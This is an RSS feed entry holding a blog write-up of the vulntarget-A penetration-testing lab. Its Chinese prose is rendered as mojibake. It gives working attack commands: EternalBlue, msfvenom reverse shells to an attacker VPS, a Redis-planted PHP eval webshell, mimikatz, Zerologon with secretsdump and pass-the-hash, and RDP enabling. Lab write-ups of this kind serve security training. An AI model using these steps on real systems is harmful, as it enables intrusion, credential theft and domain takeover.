<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>vulntarget on AmiaaaZ's Site</title><link>https://amiaaaz.github.io/series/vulntarget/</link><description>Recent content in vulntarget on AmiaaaZ's Site</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Sun, 24 Apr 2022 22:08:10 +0800</lastBuildDate><atom:link href="https://amiaaaz.github.io/series/vulntarget/index.xml" rel="self" type="application/rss+xml"/><item><title>vluntargetAé¶åœºç¬”è®°</title><link>https://amiaaaz.github.io/2022/04/24/vulntarget-a-notes/</link><pubDate>Sun, 24 Apr 2022 22:08:10 +0800</pubDate><guid>https://amiaaaz.github.io/2022/04/24/vulntarget-a-notes/</guid><description>&lt;blockquote>
&lt;p>æœ¬æœº 192.168.110.131&lt;/p>
&lt;p>é¶æœºwin7 192.168.110.129; 10.0.20.98&lt;/p>
&lt;p>åŸŸç”¨æˆ·win2016 10.0.20.98; 10.0.10.111&lt;/p>
&lt;p>åŸŸæ§win2019 10.0.10.110&lt;/p>
&lt;/blockquote>
&lt;p>è®¿é—®192.168.110.129çš„80webé¡µé¢ï¼Œæ˜¯é€šè¾¾OA&lt;/p>
&lt;p>/inc/expired.phpé¡µé¢è·å¾—ç‰ˆæœ¬ä¿¡æ¯&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220324162505563.png" alt="image-20220324162505563">&lt;/p>
&lt;p>nmapæ‰«ä¸€ä¸‹ï¼Œå¼€äº†445çš„win7ï¼Œè¯•ä¸€ä¸‹æ°¸æ’ä¹‹è“&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>use auxiliary/scanner/smb/smb_ms17_010
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>use exploit/windows/smb/ms17_010_eternalblue
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>å¾—åˆ°shellï¼Œçœ‹ä¸‹ç½‘ç»œä¿¡æ¯&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220324164533684.png" alt="image-20220324164533684">&lt;/p>
&lt;p>æœ‰ä¸€ä¸ªå†…ç½‘ip 10.0.20.98&lt;/p>
&lt;p>msfçš„ä¸ç¨³å®šï¼Œåšè¿›ç¨‹è¿ç§»ï¼›ä¸Šä¼ npcåšsocks5ä»£ç†&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>meterpreter &amp;gt; run post/windows/manage/migrate
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>meterpreter &amp;gt; upload /home/kali/t00ls/nps_client_win/npc.exe C:&lt;span style="color:#8045ff">\\&lt;/span>Users
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>npc.exe install -server&lt;span style="color:#f92672">=&lt;/span>xxx -vkey&lt;span style="color:#f92672">=&lt;/span>xxx
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>npc.exe start
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;pre tabindex="0">&lt;code>vim /etc/proxychains4.conf
# proxy dns
socks5 ip port
&lt;/code>&lt;/pre>&lt;p>å¦å¤–ä¼ ä¸€ä¸ªcsçš„ğŸå¹¶ä¸Šçº¿&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>meterpreter &amp;gt; upload /home/kali/t3mp/cs1.exe C:&lt;span style="color:#8045ff">\\&lt;/span>Users
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>beacon &amp;gt; sleep &lt;span style="color:#ae81ff">5&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>æŒ‚ä»£ç†åæ‰«æå†…ç½‘cæ®µ&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>proxychains4 nmap -Pn 10.0.20.98/24
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>å‘ç°10.0.20.99æœ‰redisï¼Œå°è¯•redisæœªæˆæƒå†™shellï¼ˆå®é™…è¿™é‡Œæ‰«å´©äº†ï¼Œç›´æ¥æ‰“çš„&lt;/p>
&lt;p>æ›´è›‹ç–¼çš„æ˜¯kaliå®‰è£…ä¸äº†redis-cliï¼Œå„ç§æ¢æºéƒ½æ— è§£ï¼Œåªèƒ½æŠŠåŸæ¥åªä»£ç»™å±€åŸŸç½‘çš„å†ä»£ç»™å…¬ç½‘ï¼Œè¿å‡ºæ¥æ‰“&lt;/p>
&lt;p>é¦–å…ˆç”Ÿæˆä¸ªmsfğŸè¿ç»™æˆ‘è‡ªå·±çš„kaliè™šæ‹Ÿæœºï¼Œè¿™é‡Œçš„å‘ç‚¹ï¼šä¸¤å¤„çš„payloadè¦ä¸¥æ ¼ä¸€è‡´ï¼ˆåˆ«å¤šä¸€ä¸ªæˆ–å°‘ä¸€ä¸ªx64ï¼Œå¦å¤–lhostè®¾ä¸º0.0.0.0æ‰å¯ä»¥è¢«ä»£å‡ºå»&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>msfvenom -p windows/meterpreter/reverse_tcp &lt;span style="color:#111">LHOST&lt;/span>&lt;span style="color:#f92672">=&lt;/span>vps_ip &lt;span style="color:#111">LPORT&lt;/span>&lt;span style="color:#f92672">=&lt;/span>port -f exe &amp;gt; msfr.exe
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>msf &amp;gt; use exploit/multi/handler
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>msf &amp;gt; &lt;span style="color:#111">set&lt;/span> payload windows/meterpreter/reverse_tcp
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>msf &amp;gt; &lt;span style="color:#111">set&lt;/span> lhost 0.0.0.0
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>msf &amp;gt; &lt;span style="color:#111">set&lt;/span> lport &lt;span style="color:#ae81ff">2308&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>msf &amp;gt; run
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>ç„¶ååœ¨å¾—åˆ°çš„shellé‡ŒæŠŠä¹‹å‰æ³¨å†Œå¥½çš„npcå–æ¶ˆæ³¨å†Œåé‡æ–°æ³¨å†Œä¸ºå…¬ç½‘çš„&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>npc.exe stop
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>npc.exe uninstall
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>npc.exe install -server&lt;span style="color:#f92672">=&lt;/span>xxx -vkey&lt;span style="color:#f92672">=&lt;/span>xxx
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>npc.exe start
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>å’Œä¹‹å‰ä¸€æ ·ï¼Œæ”¹proxychainsçš„é…ç½®æ–‡ä»¶ï¼ˆä¸å¤åˆ¶äº†ï¼‰ï¼Œwindowsç”¨proxifierï¼ˆä¹Ÿå¾ˆç®€å•ï¼‰&lt;/p>
&lt;p>2308 meterpreter&lt;/p>
&lt;p>2309 socks5 win7 win7123&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>proxychains4 redis-cli -h 10.0.20.99
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;gt; config &lt;span style="color:#111">set&lt;/span> dir &lt;span style="color:#d88200">&amp;#34;C:/phpStudy/PHPTutorial/WWW/&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;gt; config &lt;span style="color:#111">set&lt;/span> dbfilename tx.php
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;gt; &lt;span style="color:#111">set&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;lt;?php @eval(&lt;/span>&lt;span style="color:#111">$_POST&lt;/span>&lt;span style="color:#d88200">[&amp;#39;ame&amp;#39;]);?&amp;gt;&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;gt; save
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>è¿èšå‰‘ï¼Œcsä¸Šç”¨ä»£ç†è½¬å‘ä¸Šçº¿ via 10.0.20.98ï¼Œæ‰€ä»¥éœ€è¦å†å‰é¢æŠŠå…¬ç½‘çš„ä»£ç†æ¢å›å»ï¼Œå†uninstall install ä¸€æ¬¡&lt;/p>
&lt;p>æ³¨æ„å®æµ‹pivoting-&amp;gt;Listenerè¿™æ ·ç”Ÿæˆçš„åå‘é©¬å¹¶ä¸èƒ½å¼¹å›æ¥ï¼ŒåŸå› æœªçŸ¥ï¼›è§£å†³åŠæ³•æ˜¯ç”ŸæˆListenerä¸ºbeacon TCPçš„æ­£å‘é©¬ï¼Œå†åœ¨ä¹‹å‰çš„beaconä¸­connect 10.0.20.99ï¼Œå³å¯ä¸Šçº¿&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220326114155490.png" alt="image-20220326114155490">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220326114119006.png" alt="image-20220326114119006">&lt;/p>
&lt;p>mimikatzæŠ“å¯†ç ï¼Œå¾—åˆ°éæ˜æ–‡hash&lt;/p>
&lt;p>ä¸Šä¼ msfæ­£å‘ğŸå¹¶è¿æ¥&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>msfvenom -p windows/x64/meterpreter/bind_tcp &lt;span style="color:#111">LPORT&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">6698&lt;/span> -f exe &amp;gt; msfr2.exe
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>msf &amp;gt; &lt;span style="color:#111">set&lt;/span> proxies socks5:192.168.110.131:8879
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>msf &amp;gt; use exploit/multi/handler
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>msf &amp;gt; &lt;span style="color:#111">set&lt;/span> payload windows/x64/meterpreter/bind_tcp
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>msf &amp;gt; &lt;span style="color:#111">set&lt;/span> lport &lt;span style="color:#ae81ff">6698&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>msf &amp;gt; &lt;span style="color:#111">set&lt;/span> rhost 10.0.20.99
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>msf &amp;gt; exploit
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>meterpreter &amp;gt; run post/windows/manage/migrate
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>ä½†è¿™é‡Œå¾—åˆ°çš„sessionéå¸¸å®¹æ˜“æ–­ï¼ŒåŠ¨ä¸åŠ¨å°±reason: diedï¼Œåªèƒ½æ‰‹åŠ¨æŠŠé©¬å’Œexploitå¤šç”¨å‡ æ¬¡&lt;/p>
&lt;p>å®šä½åŸŸæ§&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>run post/windows/gather/enum_domain
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>å¾—åˆ°åŸŸå’ŒåŸŸæ§ä¿¡æ¯&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220326163730199.png" alt="image-20220326163730199">&lt;/p>
&lt;p>æ·»åŠ ä¸»æœºå¯¹10.0.10.*çš„è·¯ç”±&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>msf &amp;gt; &lt;span style="color:#111">bg&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>msf &amp;gt; sessions x
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>meterpreter &amp;gt; run post/multi/mamage/autoroute
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>nmapç®€å•æ‰«ä¸€ä¸‹&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>proxychains4 nmap -sS -Pn 10.0.10.110
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>ç”¨cve-2020-1472åŸŸå†…ææƒ&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>proxychains4 python3 cve-2020-1472-exploit.py win2019 10.0.10.110
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>proxychains4 python3 secretsdump.py vulntarget.com/win2019&lt;span style="color:#8045ff">\$&lt;/span>@10.0.10.110 -no-pass &lt;span style="color:#75715e"># å¾—åˆ°administratorçš„hash&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>proxychains4 python3 smbexec.py -hashes &amp;lt;hash&amp;gt; administrator@10.0.10.110
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>å¼€å¯è¿œç¨‹æ¡Œé¢&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>reg add &lt;span style="color:#d88200">&amp;#34;HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&amp;#34;&lt;/span> /t REG_DWORD /v portnumber /d &lt;span style="color:#ae81ff">3389&lt;/span> /f
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>wmic RDTOGGLE WHERE &lt;span style="color:#111">ServerName&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#39;%COMPUTERNAME%&amp;#39;&lt;/span> call SetAllowTSConnections &lt;span style="color:#ae81ff">1&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>netsh advfirewall firewall add rule &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;Remote Desktop&amp;#34;&lt;/span> &lt;span style="color:#111">protocol&lt;/span>&lt;span style="color:#f92672">=&lt;/span>TCP &lt;span style="color:#111">dir&lt;/span>&lt;span style="color:#f92672">=&lt;/span>in &lt;span style="color:#111">localport&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">3389&lt;/span> &lt;span style="color:#111">action&lt;/span>&lt;span style="color:#f92672">=&lt;/span>allow
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>proxychains rdesktop 10.0.10.110
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div></description></item></channel></rss>